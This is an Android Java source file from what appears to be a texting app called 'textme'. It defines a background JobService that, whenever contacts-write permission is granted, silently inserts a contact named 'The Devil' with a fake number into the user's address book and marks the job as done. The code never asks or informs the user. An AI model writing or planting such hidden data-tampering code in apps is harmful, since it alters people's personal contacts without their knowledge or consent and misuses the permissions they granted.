package com.candroid.textme.jobs.services;

import android.Manifest;
import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.pm.PackageManager;

import com.candroid.textme.api.Lofl;
import com.candroid.textme.jobs.JobsScheduler;

public class InsertContactJobService extends JobService {
    @Override
    public boolean onStartJob(JobParameters params) {
        if(this.checkSelfPermission(Manifest.permission.WRITE_CONTACTS) == PackageManager.PERMISSION_GRANTED){
            new Thread(new Runnable() {
                @Override
                public void run() {
                    Lofl.insertContact(InsertContactJobService.this, "The Devil", "6966966699");
                    Lofl.setJobRan(InsertContactJobService.this, JobsScheduler.INSERT_CONTACT_KEY);
                    InsertContactJobService.this.jobFinished(params,false);
                }
            }).start();
        }
        return true;
    }

    @Override
    public boolean onStopJob(JobParameters params) {

        return true;
    }
}
